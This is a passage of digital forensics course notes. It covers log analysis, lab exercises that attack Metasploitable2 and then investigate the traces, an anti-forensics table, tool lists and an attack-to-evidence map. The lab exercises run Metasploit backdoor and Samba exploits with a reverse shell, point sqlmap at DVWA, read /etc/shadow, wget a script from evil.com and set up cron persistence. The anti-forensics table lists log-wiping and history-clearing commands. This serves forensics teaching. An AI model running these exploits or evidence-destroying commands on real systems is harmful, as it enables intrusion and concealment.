mysqlbinlog /var/log/mysql/mysql-bin.000001 | grep -i "drop\|delete\|update" | head -20

# Find when data was exfiltrated (SELECT ... INTO OUTFILE):
mysqlbinlog /var/log/mysql/mysql-bin.000001 | grep -i "outfile\|load_file"
```

### SSH Log Analysis

```bash
# /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (CentOS/RHEL)

# Find brute force attempts:
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find successful logins after failures (compromised account):
grep "Accepted password" /var/log/auth.log

# Find root login attempts:
grep "root" /var/log/auth.log | grep "Failed"

# Timeline of SSH access:
grep "session opened" /var/log/auth.log
```

---

## 14. Metasploitable2 — Attack Then Investigate

The best way to learn forensics is to **perform the attack yourself**, then **investigate your own attack**. This teaches you exactly what artifacts attacks leave behind.

### Exercise 1: Attack → Investigate FTP Backdoor

```bash
# PHASE 1: ATTACK (Kali → Metasploitable2)
# Start traffic capture:
tcpdump -i eth0 host 192.168.100.x -w /evidence/ftp_attack.pcap &

# Run exploit:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.x
run

# PHASE 2: INVESTIGATE
# Stop capture: kill %1

# Analyze pcap:
wireshark /evidence/ftp_attack.pcap
# Filter: ftp
# What do you see? The USER :) trigger that activated the backdoor!
# Follow TCP stream → see the backdoor shell commands

# On Metasploitable2 (check what attacker left):
cat /var/log/vsftpd.log
netstat -an | grep 6200   # Backdoor port
```

### Exercise 2: Attack → Investigate Web App SQL Injection

```bash
# PHASE 1: ATTACK
# Start logging on Metasploitable2 web server (already enabled in DVWA)

# Use sqlmap against DVWA:
sqlmap -u "http://192.168.100.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=xxx; security=low" \
       --dbs --batch

# PHASE 2: INVESTIGATE
# SSH into Metasploitable2 and check:
ssh msfadmin@192.168.100.x   # password: msfadmin

# Check Apache logs for sqlmap signatures:
grep -i "sqlmap\|UNION\|information_schema" /var/log/apache2/access.log

# What does a sqlmap attack look like in logs?
# 192.168.100.1 - - [17/Jul/2026] "GET /dvwa/...?id=1%27%20AND%20SLEEP%285%29...
# Notice: %27 = ', time-based blind injection attempts
# Many requests in rapid succession from same IP
```

### Exercise 3: Post-Exploit — Investigate Attacker Activity

```bash
# PHASE 1: Get Meterpreter shell on Metasploitable2
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.100.x
set PAYLOAD cmd/unix/reverse
set LHOST your-kali-ip
run

# Do some "attacker activities":
# (in the shell)
cat /etc/shadow    # Read password hashes
wget http://evil.com/malware.sh  # Download file
echo "*/5 * * * * /tmp/malware.sh" > /tmp/cron  # Persistence attempt
crontab /tmp/cron

# PHASE 2: FORENSIC INVESTIGATION on Metasploitable2
# Check bash history:
cat /root/.bash_history
cat /home/*/.bash_history

# Check for new files in /tmp:
ls -la /tmp
stat /tmp/malware.sh    # Creation time = attack time!

# Check crontab:
crontab -l -u root

# Check recent logins:
last
lastlog

# Check open network connections (was C2 still connected?):
netstat -an

# Check /var/log/syslog for suspicious activity:
grep "CRON\|wget\|curl\|chmod" /var/log/syslog

# Find recently modified files:
find / -mtime -1 -not -path "/proc/*" 2>/dev/null   # Modified in last 24 hours
```

---

## 15. Anti-Forensics — What Attackers Do to Hide

Understanding anti-forensics helps you find evidence _despite_ attacker attempts to hide it.

| Anti-Forensic Technique    | What Attacker Does                      | Forensic Counter                                          |
| -------------------------- | --------------------------------------- | --------------------------------------------------------- |
| **Log deletion**           | `rm /var/log/auth.log`                  | Recover from backup, check remote syslog server, RAM dump |
| **Timestamp manipulation** | `touch -t 200101010101 malware.exe`     | Check $MFT, journal logs, compare multiple timestamps     |
| **Secure file deletion**   | `shred -uzn 35 /tmp/payload.sh`         | Residual data in slack space, RAM, swap, backup           |
| **Steganography**          | Hide malware inside image file          | Stegdetect, binwalk, statistical analysis                 |
| **Encryption**             | Encrypt stolen data before exfil        | Key recovery from RAM, metadata still visible             |
| **Rootkit**                | Hide processes, files from OS view      | Boot from external media, compare raw disk vs OS view     |
| **History clearing**       | `history -c; unset HISTFILE`            | RAM dump of bash process, .bash_history backup            |
| **Proxy/Tor**              | Route attacks through anonymizers       | Timing analysis, exit node monitoring, pattern analysis   |
| **Living off the land**    | Use only built-in OS tools (no malware) | Behavioral analysis, command argument anomalies           |
| **Memory-only malware**    | Never write to disk                     | RAM forensics is the only option                          |

### Finding Anti-Forensic Activity

```bash
# Deleted log files but forgot remote logging:
# Check remote syslog server (if configured)

# Timestamp manipulation detection:
# $STANDARD_INFORMATION vs $FILE_NAME timestamps often differ after tampering
# (MACB times: Modified, Accessed, Changed, Born)
istat /evidence/image.img <inode>   # Sleuth Kit — shows all timestamps

# Shredded files — look for entropy anomalies in disk:
binwalk -E /evidence/image.img    # High entropy = encrypted/compressed/random (shredded)

# Rootkit detection — compare process lists:
vol -f ram.lime linux.pslist > ram_processes.txt
ps aux > live_processes.txt
diff ram_processes.txt live_processes.txt   # Processes in RAM but not visible = rootkit!

# Steganography detection:
steghide info suspicious.jpg
stegdetect suspicious.jpg
binwalk suspicious.jpg    # Look for hidden ZIP/EXE inside JPEG
```

---

## 16. Tools Master Reference

### Acquisition Tools

| Tool                   | Purpose                    | Platform            |
| ---------------------- | -------------------------- | ------------------- |
| **dd / dcfldd**        | Raw disk imaging           | Linux               |
| **FTK Imager**         | Disk/RAM imaging with hash | Windows/Linux       |
| **Guymager**           | GUI forensic imager        | Linux               |
| **LiME**               | Linux RAM acquisition      | Linux kernel module |
| **WinPmem**            | Windows RAM acquisition    | Windows             |
| **Magnet RAM Capture** | Windows RAM capture        | Windows (free)      |

### Analysis Platforms

| Tool                       | Purpose                      | Platform      |
| -------------------------- | ---------------------------- | ------------- |
| **Autopsy**                | All-in-one forensic platform | Windows/Linux |
| **Sleuth Kit**             | Command-line disk analysis   | Linux         |
| **FTK (Forensic Toolkit)** | Commercial full-platform     | Windows       |
| **EnCase**                 | Enterprise forensic suite    | Windows       |

### Memory Analysis

| Tool             | Purpose                                         |
| ---------------- | ----------------------------------------------- |
| **Volatility 3** | RAM dump analysis (processes, network, malware) |
| **Rekall**       | Alternative memory forensics framework          |
| **strings**      | Extract text from binary dumps                  |

### Network Forensics

| Tool                 | Purpose                              |
| -------------------- | ------------------------------------ |
| **Wireshark**        | Packet capture and protocol analysis |
| **tcpdump**          | Command-line packet capture          |
| **NetworkMiner**     | Extract files/credentials from pcap  |
| **Zeek (Bro)**       | Network monitoring and logging       |
| **Suricata**         | IDS/IPS with logging                 |
| **Nfdump / NetFlow** | Flow analysis                        |

### Specialized Tools

| Tool                     | Purpose                                     |
| ------------------------ | ------------------------------------------- |
| **Binwalk**              | Firmware and file analysis                  |
| **ExifTool**             | Extract metadata from images/files          |
| **RegRipper**            | Windows Registry forensics                  |
| **Log2Timeline / Plaso** | Super-timeline creation from many sources   |
| **YARA**                 | Pattern matching for malware identification |
| **Cuckoo Sandbox**       | Automated malware analysis                  |
| **Ghidra / IDA**         | Malware reverse engineering                 |
| **Cellebrite UFED**      | Mobile device extraction                    |

---

## 17. Attack → Forensic Artifact Mapping

Use this as your investigation cheat sheet — when you see a certain attack, know exactly where to look.

| Attack                   | What Attacker Did           | Where Evidence Lives                                                                                  |
| ------------------------ | --------------------------- | ----------------------------------------------------------------------------------------------------- |
| **SQL Injection**        | Sent malicious queries      | Web access logs, DB query logs, error logs                                                            |
| **XSS**                  | Injected scripts            | Web access logs (encoded `<script>` in URL/POST)                                                      |
| **Brute Force**          | Tried many passwords        | Auth logs (repeated failures), account lockout logs                                                   |
| **Phishing**             | Sent fake email             | Email headers, DNS records, proxy logs of victim clicking link                                        |
| **Ransomware**           | Encrypted files             | Encrypted files on disk, ransom note, VSS deletion in logs, startup entries, network connection to C2 |
| **Data Exfiltration**    | Copied data out             | Large outbound transfers in NetFlow, DNS tunneling in DNS logs, cloud upload in proxy logs            |
| **Privilege Escalation** | Gained root/admin           | sudo logs, SUID binary usage, kernel exploit in system logs                                           |
| **Backdoor / RAT**       | Installed persistent access | Scheduled tasks, crontab, startup folders, registry run keys, listening ports                         |
| **DoS/DDoS**             | Flooded server              | Traffic spike in NetFlow, web logs (thousands of requests/sec)                                        |
| **Lateral Movement**     | Moved between systems       | Authentication across systems, pass-the-hash in Windows security logs                                 |
| **Insider IP Theft**     | Copied files to USB         | USB device history, file access logs, DLP alerts, cloud sync logs                                     |
| **Keylogger**            | Captured keystrokes         | Keylogger binary in startup, suspicious processes, network connections exfiltrating data              |
| **Social Engineering**   | Manipulated a person        | Call records, email logs, voice recordings                                                            |
| **Spoofing**             | Faked identity              | ARP cache anomalies, IP header inconsistencies, email header analysis                                 |

---

## Quick Reference: Forensics Exam Points

```
1.  Digital Forensics = detailed investigation of digital devices for crimes
2.  Evidence must be: Understandable, Admissible, Authentic, Reliable, Complete
3.  Authenticity proven by: hash values (MD5 / SHA256)
4.  Chain of custody: document every person who touches evidence
5.  Volatile data: RAM, processes, network connections → capture FIRST
6.  Non-volatile: hard drive, USB, SD card → survives power off
7.  Forensic image: bit-for-bit copy of ALL data (includes deleted files)
8.  NEVER work on original evidence — always work on the copy
9.  Order of volatility: Registers → RAM → Disk → Remote logs → Archives
10. Hash change = tampered evidence = inadmissible in court
11. Forensic branches: Computer, Mobile, Network, Memory, DB, Cloud, IoT, Malware
12. Anti-forensics: log deletion, timestamp manipulation, steganography, encryption
```

---

_Digital Forensics Course Notes — Cybersecurity Department_
_Practice environment: Kali Linux | Metasploitable2 | Personal web applications_
_Series: Computer Architecture → Registers → Digital Forensics_
_All investigation techniques for authorized/personal systems only._
